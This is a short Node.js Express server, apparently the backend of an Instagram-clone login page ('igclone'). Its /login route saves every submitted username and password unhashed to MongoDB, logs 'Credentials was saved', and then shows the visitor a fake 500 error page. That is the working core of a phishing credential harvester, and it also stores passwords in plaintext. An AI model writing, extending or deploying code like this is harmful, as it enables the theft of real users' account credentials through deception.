const express = require("express");
const app = express();
const port = 3000;
const path = require("path");
const mongoose = require("mongoose")
const User = require("./models/chat.js")

app.use(express.static("public"))
app.use(express.urlencoded({extended : true}));


main()
    .then(()=>{
        console.log("Connection Successful")
    })
    .catch((err)=>{
        console.log("Some random Error occurred")
    })
async function main() {
    await mongoose.connect('mongodb://127.0.0.1:27017/igclone')
}

app.get("/",(req,res)=>{
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
})
app.post("/login",(req,res)=>{
    let {username,password} = req.body
    let newUser = new User({
        username:username,
        password:password
    })
    newUser.save()
        .then(()=>{
            console.log("Credentials was saved")
            res.sendFile(path.join(__dirname,"public","500.html"))
        })
        .catch((err)=>{
            console.log(`Some random err occurred : ${err}`)
        })
})

app.listen(port,()=>{
    console.log(`Server is running on http://localhost:${port}`);
})